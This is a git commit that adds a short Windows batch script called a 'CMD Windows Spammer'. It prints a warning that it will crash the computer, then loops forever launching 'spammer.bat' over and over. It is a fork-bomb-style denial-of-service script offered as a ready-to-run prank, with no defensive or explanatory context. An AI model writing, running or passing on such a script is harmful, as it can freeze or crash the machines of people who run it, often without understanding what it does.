55a104e6d2cf34c2b6a03cfa587516e23ad80286
CarGuyJake <79112590+CarGuyJake@users.noreply.github.com>
2021-04-02 12:35:36 -0400

    Add files via upload

---
+++ CarGuyJake's CMD Windows Spammer.bat
@@ -0,0 +1,15 @@
+@echo off
+color 4
+echo WARNING!!! THIS WILL CRASH YUR COMPUTER!! YOU MUST REBOOT IT AFTER YOU'RE DONE!! Developed By CarGuyJake 11:38 PM --JW#1217 On Discord--
+pause-
+goto a
+
+:a
+start spammer.bat
+start spammer.bat
+start spammer.bat
+start spammer.bat
+start spammer.bat
+start spammer.bat
+start spammer.bat
+goto a
